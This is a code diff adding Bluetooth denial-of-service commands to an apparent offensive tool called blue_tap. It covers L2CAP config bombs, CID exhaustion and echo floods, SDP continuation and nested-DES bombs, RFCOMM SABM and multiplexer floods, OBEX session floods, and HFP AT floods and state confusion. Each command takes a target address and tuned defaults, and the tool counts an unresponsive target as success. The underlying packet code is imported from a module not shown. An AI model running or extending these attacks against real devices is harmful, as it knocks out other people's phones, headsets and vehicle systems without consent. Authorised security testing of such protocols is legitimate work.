@@ -1901,6 +1901,172 @@ def dos_l2ping_flood(address, count, size, no_flood):
         info(f"  {k}: {v}")
 
 
+# ---- Protocol-level DoS attacks (L2CAP, SDP, RFCOMM, OBEX, HFP) ----
+
+@dos.command("l2cap-config-bomb")
+@click.argument("address", required=False, default=None)
+@click.option("--rounds", default=100, help="Number of config bombs to send")
+def dos_l2cap_config_bomb(address, rounds):
+    """L2CAP config option bomb — force memory allocation via unknown options."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import L2CAPDoS
+    attack = L2CAPDoS(address)
+    result = attack.config_option_bomb(rounds=rounds)
+    _show_dos_result(result)
+
+
+@dos.command("l2cap-cid-exhaust")
+@click.argument("address", required=False, default=None)
+@click.option("--count", default=200, help="Number of CIDs to exhaust")
+def dos_l2cap_cid_exhaust(address, count):
+    """L2CAP CID exhaustion — open channels without configuring them."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import L2CAPDoS
+    attack = L2CAPDoS(address)
+    result = attack.cid_exhaustion(count=count)
+    _show_dos_result(result)
+
+
+@dos.command("l2cap-echo-amp")
+@click.argument("address", required=False, default=None)
+@click.option("--count", default=500, help="Number of echo requests")
+@click.option("--size", default=672, help="Echo payload size")
+def dos_l2cap_echo_amp(address, count, size):
+    """L2CAP echo amplification — flood with max-size echo requests."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import L2CAPDoS
+    attack = L2CAPDoS(address)
+    result = attack.echo_amplification(count=count, payload_size=size)
+    _show_dos_result(result)
+
+
+@dos.command("sdp-continuation")
+@click.argument("address", required=False, default=None)
+@click.option("--connections", default=10, help="Parallel SDP connections")
+def dos_sdp_continuation(address, connections):
+    """SDP continuation state exhaustion — abandon fragmented SDP sessions."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import SDPDoS
+    attack = SDPDoS(address)
+    result = attack.continuation_exhaustion(connections=connections)
+    _show_dos_result(result)
+
+
+@dos.command("sdp-des-bomb")
+@click.argument("address", required=False, default=None)
+@click.option("--depth", default=100, help="DES nesting depth")
+def dos_sdp_des_bomb(address, depth):
+    """SDP nested DES bomb — recursive data element parsing overload."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import SDPDoS
+    attack = SDPDoS(address)
+    result = attack.nested_des_bomb(depth=depth)
+    _show_dos_result(result)
+
+
+@dos.command("rfcomm-sabm-flood")
+@click.argument("address", required=False, default=None)
+@click.option("--count", default=60, help="DLCIs to open (max 60)")
+def dos_rfcomm_sabm_flood(address, count):
+    """RFCOMM SABM flood — open all 60 DLCIs to exhaust DLC pool."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import RFCOMMDoS
+    attack = RFCOMMDoS(address)
+    result = attack.sabm_flood(count=count)
+    _show_dos_result(result)
+
+
+@dos.command("rfcomm-mux-flood")
+@click.argument("address", required=False, default=None)
+@click.option("--count", default=500, help="Multiplexer commands to send")
+def dos_rfcomm_mux_flood(address, count):
+    """RFCOMM multiplexer flood — flood Test commands on DLCI 0."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import RFCOMMDoS
+    attack = RFCOMMDoS(address)
+    result = attack.mux_command_flood(count=count)
+    _show_dos_result(result)
+
+
+@dos.command("obex-connect-flood")
+@click.argument("address", required=False, default=None)
+@click.option("--count", default=20, help="OBEX sessions to open")
+def dos_obex_connect_flood(address, count):
+    """OBEX session exhaustion — open all OBEX services simultaneously."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import OBEXDoS
+    attack = OBEXDoS(address)
+    result = attack.connect_flood(count=count)
+    _show_dos_result(result)
+
+
+@dos.command("hfp-at-flood")
+@click.argument("address", required=False, default=None)
+@click.option("--channel", default=10, help="HFP RFCOMM channel")
+@click.option("--count", default=5000, help="AT commands to send")
+def dos_hfp_at_flood(address, channel, count):
+    """HFP AT command flood — overwhelm the AT command parser."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import HFPDoS
+    attack = HFPDoS(address)
+    result = attack.at_command_flood(channel=channel, count=count)
+    _show_dos_result(result)
+
+
+@dos.command("hfp-slc-confuse")
+@click.argument("address", required=False, default=None)
+@click.option("--channel", default=10, help="HFP RFCOMM channel")
+def dos_hfp_slc_confuse(address, channel):
+    """HFP SLC state machine confusion — out-of-order AT commands."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.protocol_dos import HFPDoS
+    attack = HFPDoS(address)
+    result = attack.slc_state_confusion(channel=channel)
+    _show_dos_result(result)
+
+
+def _show_dos_result(result: dict) -> None:
+    """Display DoS attack results."""
+    name = result.get("attack", "?")
+    target = result.get("target", "?")
+    status = result.get("result", "unknown")
+
+    if status == "target_unresponsive":
+        success(f"[bold]{name}[/bold] against {target}: target became unresponsive")
+    elif status == "success":
+        success(f"[bold]{name}[/bold] against {target}: completed")
+    else:
+        info(f"[bold]{name}[/bold] against {target}: {status}")
+
+    for key in ("packets_sent", "duration_seconds", "notes"):
+        val = result.get(key)
+        if val:
+            info(f"  {key}: {val}")
+
+    from blue_tap.utils.session import log_command
+    log_command(f"dos_{name}", result, category="dos", target=result.get("target", ""))
+
+
 # ============================================================================
 # FUZZ - Protocol Fuzzing
 # ============================================================================
